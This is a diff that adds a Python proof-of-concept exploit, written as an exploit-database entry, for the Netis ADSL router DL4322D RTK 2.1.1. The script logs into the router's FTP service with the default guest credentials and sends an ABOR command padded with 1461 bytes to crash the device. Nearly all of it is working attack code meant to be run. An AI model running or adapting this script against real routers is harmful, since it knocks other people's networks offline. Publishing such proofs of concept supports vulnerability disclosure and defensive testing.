@@ -1,0 +1,43 @@
+# Exploit Title: Netis ADSL Router DL4322D RTK 2.1.1 - Denial of Service (PoC)
+# Author: Cakes
+# Discovery Date: 2018-09-16
+# Vendor Homepage: http://www.netis-systems.com
+# Software Link: http://www.netis-systems.com/Home/detail/id/74.html
+# Tested Version: RTK 2.1.1
+# Tested on OS: Kali Linux
+# CVE: N/A
+
+# Description
+# The FTP service is vulnerable to a Denial of Service attack. Attackers simply need to log
+# into the router and send and valid FTP command with a character offset of 1461 as the command input
+
+import socket 
+
+evil = '\x41'*1461
+
+print "\n[*] Netis ADSL Router DL4322D RTK 2.1.1 - Denial of Service (PoC)"
+print "\r[i] Creating socket"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print "\r[i] Connecting..."
+connect = s.connect(('192.168.1.1',21))
+s.recv(1024)
+
+try:
+	s.send('USER guest\r\n')
+	s.recv(1024)
+	s.send('PASS guest\r\n')
+	s.recv(1024)
+	print "\r[+] Connected"
+except:
+	print "\r[!] Credentials aren't working. Please change if none default"
+	
+print "\r[+] Sending Payload"
+
+try:
+	s.send('ABOR %s' % (evil))
+	print "\r[+] Payload sent"
+	print "\r[+] Router offline"
+except:
+	print "\r[!] Something went wrong"
+	
+s.close()
